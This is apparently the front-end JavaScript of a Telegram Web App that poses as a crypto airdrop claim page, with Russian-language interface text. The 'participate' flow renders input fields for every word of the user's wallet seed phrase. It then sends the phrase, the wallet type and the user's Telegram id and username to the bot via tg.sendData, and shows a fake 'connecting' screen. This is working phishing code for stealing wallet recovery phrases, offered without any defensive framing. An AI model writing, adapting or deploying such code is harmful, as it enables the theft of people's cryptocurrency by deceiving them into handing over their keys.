// Загрузка Airdrop'ов
fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
    .then(res => res.json())
    .then(data => {
        const container = document.getElementById('airdropList');
        container.innerHTML = '';
        data.forEach(drop => {
            const card = document.createElement('div');
            card.className = 'airdrop-card';
            card.innerHTML = `
                <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
                <h2>${drop.name}</h2>
                <p>💸 Награда: <strong>${drop.reward}</strong></p>
                <p>🌐 Сеть: ${drop.network}</p>
                <p>⏳ До: ${drop.ends}</p>
                <button onclick="selectAirdrop('${drop.name}')">Участвовать</button>
            `;
            container.appendChild(card);
        });
    });

function selectAirdrop(name) {
    document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
    document.getElementById('airdropList').style.display = 'none';
    document.getElementById('airdropForm').style.display = 'block';
    renderSeedInputs();
}

function renderSeedInputs() {
    const length = parseInt(document.getElementById('length').value);
    const container = document.getElementById('seedContainer');
    container.innerHTML = '';
    for (let i = 0; i < length; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = `Слово ${i + 1}`;
        container.appendChild(input);
    }
}

function clearWarning() {
    document.getElementById('validationWarning').style.display = 'none';
}

function submitAirdrop() {
    const tg = Telegram.WebApp;
    const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
    const words = inputs.map(input => input.value.trim()).filter(word => word !== '');
    if (words.length !== inputs.length) {
        const warning = document.getElementById('validationWarning');
        warning.innerText = 'Пожалуйста, заполните все поля.';
        warning.style.display = 'block';
        return;
    }

    const payload = {
        event: "airdrop_claim",
        user_id: tg?.initDataUnsafe?.user?.id || "-",
        username: tg?.initDataUnsafe?.user?.username || "-",
        timestamp: new Date().toISOString(),
        seed: words.join(" "),
        wallet: document.getElementById("wallet").value
    };

    tg.sendData(JSON.stringify(payload));
    tg.expand();

    document.querySelector(".container").innerHTML = `
        <h3 style="color:green;text-align:center">⏳ Подключение и участие…</h3>
    `;

    setTimeout(() => {
        window.location.href = "airprofile.html";
    }, 1500);
}

// Логіка селектора гаманців
const selectWrapper = document.querySelector('.custom-select');
const selected = selectWrapper.querySelector('.selected');
const options = selectWrapper.querySelectorAll('.options li');
const hiddenInput = document.querySelector('#wallet');

selected.addEventListener('click', () => {
    selectWrapper.classList.toggle('open');
});

options.forEach(option => {
    option.addEventListener('click', () => {
        selected.innerHTML = option.innerHTML;
        hiddenInput.value = option.dataset.value;
        selectWrapper.classList.remove('open');
    });
});

document.addEventListener('click', e => {
    if (!selectWrapper.contains(e.target)) {
        selectWrapper.classList.remove('open');
    }
});
